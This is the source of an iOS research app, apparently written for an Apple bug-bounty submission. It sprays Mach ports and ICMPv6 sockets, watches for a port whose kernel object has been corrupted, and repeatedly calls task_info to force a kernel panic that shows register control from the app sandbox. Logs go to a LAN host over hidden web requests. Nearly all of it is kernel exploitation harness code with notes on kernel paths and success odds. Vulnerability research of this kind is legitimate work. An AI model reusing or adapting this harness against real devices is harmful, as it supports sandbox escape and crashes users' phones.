/*
 * AllocatorProbe v17_probe — N=20000 + Active task_info Probe + HTTP Reporting
 * =============================================================================
 * Changes from v16:
 *   - REMOVED: blind_destroy() — mach_port_destroy decrements io_refs 2->1 (not 0).
 *     Port never finalized -> ip_kobject never dereferenced -> structurally P(qualifying)~0.
 *     This was the root cause of 107 consecutive null cycles.
 *
 *   - ADDED: probe_loop thread — calls task_info(port, TASK_BASIC_INFO) on all 20,000
 *     ports every 5 seconds.
 *
 *     Kernel path for a normal spray port (kotype=0):
 *       task_info() -> convert_port_to_task() -> kotype check fails -> KERN_INVALID_ARGUMENT
 *       (no ip_get_kobject call; no AUTDA; safe)
 *
 *     Kernel path for the ONE corrupted port (kotype=2=IKOT_TASK_CONTROL, ip_kobject=commpage):
 *       task_info() -> convert_port_to_task() -> kotype==IKOT_TASK_CONTROL -> OK
 *       -> ip_get_kobject(port) -> AUTDA(0x0000000FFFFFC330, key, port_addr)
 *       -> PAC auth fails (no valid signature in raw commpage value)
 *       -> FEAT_FPAC: immediate EL1 synchronous exception
 *       -> Kernel panic IPS: bug_type=210, EL1 register dump, GPR=0x0000000FFFFFC330
 *       -> QUALIFYING ARTIFACT: Apple Security Bounty App sandbox -> kernel register control
 *
 *   - App stays alive indefinitely (no exit after destroy).
 *     scan_background() still runs to detect QUALIFYING_HIT via mach_port_kobject.
 *
 * Expected performance: P(qualifying per fire cycle) = p_overlap = ~0.037
 * E[cycles to first qualifying panic] = 27  E[time] ~= 2 hours
 *
 * Qualifying artifact: bug_type=210 IPS, EL1 register dump, >=1 GPR=0x0000000FFFFFC330
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <mach/task_info.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>

#define NUM_PORTS        20000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define REPORT_HOST      "192.168.68.106"
#define PROBE_INTERVAL_S 5

static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;
static _Atomic int g_found = 0;
static WKWebView  *g_webView = nil;

static void http_report(const char *msg) {
    WKWebView *wv = g_webView;
    if (!wv) return;
    NSString *raw = [NSString stringWithUTF8String:msg];
    if (!raw) return;
    raw = [raw stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *script = [NSString stringWithFormat:
        @"var x=new XMLHttpRequest();"
        "x.open('POST','http://%s:9999/',true);"
        "x.send('[v17p] %@');",
        REPORT_HOST, raw];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:script completionHandler:nil];
    });
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    NSLog(@"[v17p] %{public}s", buf);
    http_report(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("V17P_SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

/* probe_loop: continuously probes all spray ports via task_info() every PROBE_INTERVAL_S.
 *
 * For normal ports (kotype=0): convert_port_to_task() rejects early (wrong kotype),
 * returns KERN_INVALID_ARGUMENT before reaching ip_get_kobject(). Safe.
 *
 * For the corrupted port (kotype=IKOT_TASK_CONTROL=2, ip_kobject=0x0000000FFFFFC330):
 *   convert_port_to_task() sees kotype=2=IKOT_TASK_CONTROL -> calls ip_get_kobject(port)
 *   -> AUTDA(0x0000000FFFFFC330, key, port_addr) -> PAC auth fails (no signature)
 *   -> FEAT_FPAC -> immediate EL1 synchronous exception -> device reboots
 *   -> IPS written to /var/mobile/Library/Logs/CrashReporter/
 *   -> Triage: bug_type=210 + EL1 context + GPR contains 0x0000000FFFFFC330 -> submit
 */
static void *probe_loop(void *arg) {
    struct task_basic_info info;
    mach_msg_type_number_t count;
    int cycle = 0;

    for (;;) {
        int invalid_arg = 0, success = 0, other = 0;
        for (int i = 0; i < g_port_count; i++) {
            if (g_ports[i] == MACH_PORT_NULL) continue;
            count = TASK_BASIC_INFO_COUNT;
            kern_return_t kr = task_info((task_t)g_ports[i], TASK_BASIC_INFO,
                                         (task_info_t)&info, &count);
            if (kr == KERN_INVALID_ARGUMENT) {
                invalid_arg++;
            } else if (kr == KERN_SUCCESS) {
                /* Unexpected: a spray port returned as a valid task.
                 * Should not happen with freshly allocated receive rights.
                 * Log for diagnostic and keep probing. */
                success++;
                ev("PROBE_UNEXPECTED_SUCCESS port_idx=%d kr=KERN_SUCCESS", i);
            } else {
                other++;
            }
        }
        cycle++;
        ev("PROBE_CYCLE cycle=%d ports=%d invalid_arg=%d success=%d other=%d",
           cycle, g_port_count, invalid_arg, success, other);
        sleep(PROBE_INTERVAL_S);
    }
    return NULL;
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                g_found = 1;
                ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx — probe_loop will trigger EL1 panic",
                   i, kotype, (unsigned long long)kobject);
                /* Do NOT call mach_port_destroy here.
                 * Keep port alive so probe_loop hits AUTDA -> FEAT_FPAC -> qualifying panic. */
            } else {
                ev("KOBJECT_HIT_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx need_kotype=2",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype != 0 || kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    /* ICMPv6 canary check */
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow  *window;
@property (strong) NSTimer   *scanTimer;
@property (strong) WKWebView *reportView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 340, 60)];
    lbl.text = @"AllocatorProbe v17_probe";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    /* Minimal WKWebView for HTTP reporting only — no GPU content, no fire page */
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = NO;
    self.reportView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:cfg];
    self.reportView.hidden = YES;
    [vc.view addSubview:self.reportView];
    [self.reportView loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    g_webView = self.reportView;

    spray();

    /* Launch probe thread.
     * Every 5s: task_info() on all 20,000 ports.
     * Corrupted port (kotype=IKOT_TASK_CONTROL, ip_kobject=commpage) ->
     *   ip_get_kobject -> AUTDA fail -> FEAT_FPAC -> EL1 panic -> qualifying IPS */
    pthread_t probe_thread;
    pthread_create(&probe_thread, NULL, probe_loop, NULL);
    pthread_detach(probe_thread);

    ev("V17P_LAUNCH AllocatorProbe v17_probe N=%d probe-interval=%ds no-blind-destroy",
       g_port_count, PROBE_INTERVAL_S);

    self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                      target:self
                                                    selector:@selector(scanTick:)
                                                    userInfo:nil repeats:YES];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
